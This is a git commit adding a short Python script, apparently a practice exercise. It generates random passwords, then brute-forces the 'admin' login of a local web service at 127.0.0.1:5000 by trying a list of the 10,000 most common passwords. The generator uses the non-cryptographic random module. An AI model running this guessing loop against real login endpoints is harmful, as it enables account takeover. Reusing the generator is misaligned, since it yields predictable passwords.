8243cfb1a325fea64a8f11ab60464d49956d8fcc
Ken760 <nehnaev@gmail.com>
2020-11-18 01:28:11 +0300

    Initial commit

---
+++ password.py
@@ -0,0 +1,45 @@
+import random
+
+import requests
+
+
+def good_password_generator(length=10):
+    letters = 'abcdefgihjklmnopqrstuvwxyz'
+    upper_letters = 'ABCDEFGIHJKLMNOPQRSTUVWXYZ'
+    digits = '0123456789'
+    symbols = '!@#$%^&*()_+-=\'\\"'
+
+    alphabet = letters + upper_letters + digits + symbols
+
+    password = ''
+    for i in range(length):
+        char = random.choice(alphabet)
+        password += char
+
+    return password
+
+
+with open('10k-most-common.txt') as popular_passwords_file:
+    popular_passwords = popular_passwords_file.read().split('\n')
+
+counter = 0
+
+
+def bad_password_generator():
+    global counter
+    password = popular_passwords[counter]
+
+    counter += 1
+    if counter >= len(popular_passwords):
+        counter = 0
+
+    return password
+
+
+while True:
+    password = bad_password_generator()
+    response = requests.post('http://127.0.0.1:5000/auth',
+                             json={'login': 'admin', 'password': password})
+    if response.status_code == 200:
+        print(password)
+        break
